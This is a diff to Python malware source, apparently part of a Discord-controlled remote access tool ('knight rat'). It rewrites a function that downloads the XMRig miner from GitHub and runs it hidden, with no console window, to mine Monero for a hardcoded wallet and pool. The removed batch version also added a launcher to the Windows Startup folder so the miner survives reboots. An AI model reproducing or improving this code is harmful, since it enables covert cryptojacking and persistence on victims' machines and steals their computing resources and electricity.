@@ -2530,49 +2530,39 @@ def run_knight_rat():
     bot.run(btoken)
 
 def xmrig():
-    batch_code = """
-@echo off
+    working_dir = os.path.join(os.getenv('APPDATA'), 'rose')
 
-set XMRIG_URL=https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip
+    if not os.path.exists(working_dir):
+        os.mkdir(working_dir)
+    
+    xmrig_zip = os.path.join(working_dir, 'xmrig.zip')
+    xmrig_dir = os.path.join(working_dir, 'xmrig')
+    xmrig_exe = os.path.join(xmrig_dir, 'xmrig-6.21.0', 'xmrig.exe')
 
-REM Generating a random directory name for installation
-set "INSTALL_DIR=%USERPROFILE%\\Documents\\%RANDOM%\\%RANDOM%"
+    if os.path.exists(xmrig_dir):
+        shutil.rmtree(xmrig_dir)
 
-mkdir "%INSTALL_DIR%"
-cd /d "%INSTALL_DIR%"
-
-powershell -command "& {{Invoke-WebRequest '%XMRIG_URL%' -OutFile 'xmrig.zip'}}"
-
-powershell -command "& {{Expand-Archive -Path '.\\xmrig.zip' -DestinationPath '.'}}"
-
-cd xmrig-6.21.0
-
-echo @echo off > start_xmrig.bat
-echo cd /d "%INSTALL_DIR%\\xmrig-6.21.0" >> start_xmrig.bat
-echo start xmrig.exe --donate-level 1 -o de.monero.herominers.com:1111 -u 49vfj17oFnshJpoX52tmacXhXd9ivUjdJC51fPUG8dFsXY8m39rTYj2TzrMWp7QwARP3QtBCKEqvkjDiYDMADD5PALx1XBu -p {} -a rx/0 -k --background >> start_xmrig.bat
-
-echo move /y "start_xmrig.bat" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" > move_to_startup.bat
-call move_to_startup.bat
-del move_to_startup.bat
-
-cd %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
-call start_xmrig.bat %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\
-exit
-""".format(get_random_string(12))
-
-    batch_filepath = os.path.join(os.environ["TEMP"], "batchscript.bat")
-
-    with open(batch_filepath, "w") as f:
-        f.write(batch_code)
+    if os.path.exists(xmrig_zip):
+        os.remove(xmrig_zip)
+    
+    response = requests.get('https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip')
+    response.raise_for_status()
+    
+    open(xmrig_zip, 'wb').write(response.content)
+    
+    with ZipFile(xmrig_zip, 'r') as zip_ref:
+        zip_ref.extractall(xmrig_dir)
 
     startupinfo = subprocess.STARTUPINFO()
     startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 
     subprocess.Popen(
-        ["cmd.exe", "/c", batch_filepath],
+        [xmrig_exe, "--donate-level", "1", "-o", "de.monero.herominers.com:1111", "-u", "49vfj17oFnshJpoX52tmacXhXd9ivUjdJC51fPUG8dFsXY8m39rTYj2TzrMWp7QwARP3QtBCKEqvkjDiYDMADD5PALx1XBu", "-p", get_random_string(12), "-a", "rx/0", "-k", "--background"],
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
         startupinfo=startupinfo,
+        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
+        close_fds=True
     )
 
 class DiscordX():
